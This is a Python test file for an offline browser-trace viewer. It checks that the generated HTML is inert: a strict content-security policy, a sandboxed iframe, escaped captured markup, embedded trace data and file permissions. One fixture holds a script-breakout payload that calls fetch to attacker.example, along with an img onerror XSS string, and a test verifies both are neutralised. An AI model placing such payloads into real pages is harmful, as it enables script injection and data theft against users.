"""Tests for the offline trace viewer (issue #108).

A port of ``js/tests/unit/traces/viewer.test.js``.
"""

from __future__ import annotations

import itertools
import json
import re
import sys
from pathlib import Path
from typing import Any

import pytest

from browser_commander.traces import (
    DEFAULT_MAX_INLINE_BYTES,
    TraceFiles,
    TraceMode,
    TraceRecorder,
    read_trace,
    render_trace_viewer,
    start_trace,
    write_trace_viewer,
)
from tests.helpers.trace_fakes import FakeCommander, FakePage, make_snapshot

_RUNS = itertools.count(1)


async def begin_trace(
    directory: Path, name: str, page: FakePage | None = None, **options: Any
) -> tuple[TraceRecorder, FakePage]:
    page = page or FakePage(make_snapshot())
    trace = await start_trace(
        FakeCommander(page),
        output=str(directory / name),
        mode=TraceMode.CONTINUOUS,
        screenshots=False,
        # The checkpoints are exactly the ones each test names; the base
        # snapshot a continuous trace takes on its own is the recorder's.
        initial_checkpoint=False,
        **options,
    )
    return trace, page


async def record_bundle(
    directory: Path,
    snapshot: dict[str, Any] | None = None,
    checkpoints: tuple[str, ...] = ("first",),
) -> str:
    trace, _ = await begin_trace(
        directory, f"run-{next(_RUNS)}", FakePage(snapshot or make_snapshot())
    )
    for name in checkpoints:
        await trace.checkpoint(name)
    return (await trace.stop())["path"]


def embedded(viewer: str) -> dict[str, Any]:
    match = re.search(
        r'<script id="trace-data" type="application/json">([\s\S]*?)</script>',
        viewer,
    )
    assert match is not None
    return json.loads(match.group(1))


async def render_for(directory: Path, snapshot: dict[str, Any] | None = None) -> str:
    return render_trace_viewer(read_trace(await record_bundle(directory, snapshot)))


async def data_after_stopping(trace: TraceRecorder) -> dict[str, Any]:
    stopped = await trace.stop()
    return embedded(render_trace_viewer(read_trace(stopped["path"])))


class TestInertness:
    async def test_forbids_everything_the_captured_page_might_reach_for(
        self, tmp_path: Path
    ) -> None:
        viewer = await render_for(tmp_path)

        match = re.search(
            r'<meta http-equiv="Content-Security-Policy" content="([^"]+)"', viewer
        )
        assert match is not None
        policy = match.group(1)
        assert "default-src 'none'" in policy
        assert not re.search(r"https?:", policy)
        assert "connect-src" not in policy

    async def test_renders_the_captured_page_in_a_frame_with_no_privileges(
        self, tmp_path: Path
    ) -> None:
        viewer = await render_for(tmp_path)

        match = re.search(r"<iframe [^>]*>", viewer)
        assert match is not None
        frame = match.group(0)
        assert re.search(r"\ssandbox(\s|>)", frame)
        assert "allow-scripts" not in frame
        assert "allow-forms" not in frame
        assert "allow-same-origin" not in frame
        assert 'referrerpolicy="no-referrer"' in frame

    async def test_never_lets_captured_markup_into_the_viewer_document(
        self, tmp_path: Path
    ) -> None:
        viewer = await render_for(
            tmp_path,
            make_snapshot(
                html=(
                    "<html><body></script><script>"
                    'fetch("https://attacker.example")</script>'
                    "<img src=x onerror=alert(1)></body></html>"
                )
            ),
        )

        assert viewer.count("<script") == 2
        assert "<img" not in viewer
        assert "</script><script>" not in viewer
        assert "\\u003cimg src=x onerror=alert(1)\\u003e" in viewer

    async def test_escapes_the_line_separators_javascript_treats_as_newlines(
        self, tmp_path: Path
    ) -> None:
        viewer = await render_for(
            tmp_path, make_snapshot(html="<p>one\u2028two\u2029three</p>")
        )

        assert "\u2028" not in viewer
        assert "\u2029" not in viewer
        assert "\\u2028" in viewer


class TestWhatItEmbeds:
    async def test_carries_the_trace_inline_so_it_opens_from_a_file_url(
        self, tmp_path: Path
    ) -> None:
        bundle = await record_bundle(tmp_path, checkpoints=("first", "second"))

        viewer = render_trace_viewer(read_trace(bundle))

        data = embedded(viewer)
        assert len(data["checkpoints"]) == 2
        assert "captured" in data["html"]["1"]
        assert len(data["state"]["1"]["controls"]) > 0
        assert len(data["events"]) > 0
        assert not re.search(r'(?:src|href)="[^"]*checkpoints/', viewer)
        assert "fetch(" not in viewer

    async def test_carries_ordered_mutation_batches_for_replay(
        self, tmp_path: Path
    ) -> None:
        trace, page = await begin_trace(tmp_path, "replayed")
        await trace.checkpoint("first")
        page.mutations.extend(
            [
                {"sequence": 1, "records": [{"kind": "attributes"}]},
                {"sequence": 2, "records": [{"kind": "childList"}]},
            ]
        )
        await trace.checkpoint("second")

        data = await data_after_stopping(trace)

        assert [batch["sequence"] for batch in data["mutations"]["1"]] == [1, 2]

    async def test_diffs_each_checkpoint_against_the_one_before_it(
        self, tmp_path: Path
    ) -> None:
        trace, page = await begin_trace(tmp_path, "diffed")
        await trace.checkpoint("before")
        page.snapshot = make_snapshot(
            state={
                "controls": [{"path": "form > input", "tag": "input", "value": "bob"}]
            }
        )
        await trace.checkpoint("after")

        data = await data_after_stopping(trace)

        assert data["diffs"]["1"] == []
        assert data["diffs"]["2"] == [
            {
                "path": "form > input",
                "change": "changed",
                "before": "alice",
                "after": "bob",
            }
        ]

    async def test_leaves_out_a_checkpoint_too_large_to_embed_and_says_which(
        self, tmp_path: Path
    ) -> None:
        bundle = await record_bundle(tmp_path)

        data = embedded(render_trace_viewer(read_trace(bundle), max_inline_bytes=8))

        assert data["elided"] == [1]
        assert data["html"]["1"] is None
        assert len(data["checkpoints"]) == 1
        assert data["state"]["1"]

    async def test_embeds_everything_short_of_the_default_ceiling(
        self, tmp_path: Path
    ) -> None:
        assert DEFAULT_MAX_INLINE_BYTES == 8 * 1024 * 1024

        data = embedded(await render_for(tmp_path))

        assert data["elided"] == []

    async def test_shows_what_the_run_was_and_how_it_ended(
        self, tmp_path: Path
    ) -> None:
        viewer = await render_for(tmp_path)

        assert "mode continuous" in viewer
        assert "outcome complete" in viewer
        assert "engine playwright" in viewer


class TestWritingItIntoABundle:
    async def test_puts_the_viewer_next_to_the_trace_it_explains(
        self, tmp_path: Path
    ) -> None:
        bundle = await record_bundle(tmp_path)

        target = write_trace_viewer(bundle)

        assert target == str(Path(bundle, TraceFiles.VIEWER))
        assert Path(target).read_text(encoding="utf-8").startswith("<!DOCTYPE html>")
        if sys.platform != "win32":
            assert Path(target).stat().st_mode & 0o777 == 0o600

    async def test_still_explains_a_run_that_never_stopped(
        self, tmp_path: Path
    ) -> None:
        trace, _ = await begin_trace(tmp_path, "killed")
        await trace.checkpoint("the last thing it did")
        Path(trace.path, TraceFiles.MANIFEST).unlink(missing_ok=True)

        body = Path(write_trace_viewer(trace.path)).read_text(encoding="utf-8")

        assert "outcome truncated" in body
        assert re.search(r"the last thing it did|1 checkpoints", body)

        await trace.stop()

    async def test_refuses_a_directory_that_is_not_a_bundle(
        self, tmp_path: Path
    ) -> None:
        empty = tmp_path / "not-a-bundle"
        empty.mkdir()

        with pytest.raises(Exception, match="no trace bundle at"):
            write_trace_viewer(empty)
